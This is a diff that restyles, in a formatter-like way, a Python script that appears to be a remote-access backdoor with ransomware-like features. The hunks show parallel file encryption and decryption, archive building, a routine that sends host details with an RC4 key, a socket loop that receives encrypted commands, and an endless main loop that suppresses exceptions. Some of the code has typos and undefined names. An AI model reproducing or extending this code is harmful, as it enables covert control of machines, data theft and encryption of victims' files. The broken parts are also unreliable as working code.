@@ -160,7 +160,9 @@ def encrypt_files(key, *paths, decrypt: bool = False):
             process = Process(
                 target=encrypt_file,
                 args=(key, filepath, decrypt),
-                name=("decrypt" if decrypt else "encrypt") + "_file " + repr(filepath),
+                name=("decrypt" if decrypt else "encrypt")
+                + "_file "
+                + repr(filepath),
             )
             process.start()
 
@@ -175,6 +177,7 @@ def encrypt_file(key_, path, decrypt: bool = False):
         file.write(data)
         file.truncate()
 
+
 def make_tar_archive():
     with taropen(
         name, "w:" + indexed_extensions.get(index + 1, "")
@@ -185,6 +188,7 @@ def make_tar_archive():
             for filepath in iglob(path, recusive=True)
         )
 
+
 def make_zip_archive(name, *paths):
     with ZipFile(name, "w") as zipfile:
         tuple(
@@ -192,6 +196,7 @@ def make_zip_archive(name, *paths):
             for path in paths
             for filepath in iglob(path, recusive=True)
         )
+
 
 def archive_files(name, *paths):
     indexed_extensions = {
@@ -205,7 +210,9 @@ def archive_files(name, *paths):
     else:
         return b'Filename error, extension must be ".zip", ".tar.gz", ".tar.bz2", ".tar.xz" or ".tar"'
 
-    process = Process(target=make_archive, args=(name, *paths), name="archive_files " + name)
+    process = Process(
+        target=make_archive, args=(name, *paths), name="archive_files " + name
+    )
     process.start()
     return b"Making archive..."
 
@@ -380,7 +387,9 @@ def send_environnement(all=True):
                         "system": system(),
                         "encoding": "base85",
                         "commpression": "gzip",
-                        "key": b85encode(compress(key_temp := urandom(256))).decode(),
+                        "key": b85encode(
+                            compress(key_temp := urandom(256))
+                        ).decode(),
                     }
                 ).encode()
                 if all
@@ -425,7 +434,7 @@ def command(data):
     )
     command = rc4(s.recv(65535).split(b"\r\n\r\n", 1)[1], True).decode()
     if command.strip().startswith("cd "):
-        data = b'done'
+        data = b"done"
         chdir(command[3:])
         send_environnement(False)
     elif command.strip() == "update_environment":
@@ -495,6 +504,7 @@ def command(data):
             + b" childs process are running..."
         )
     return data
+
 
 while True and __name__ == "__main__":
     with suppress(Exception):
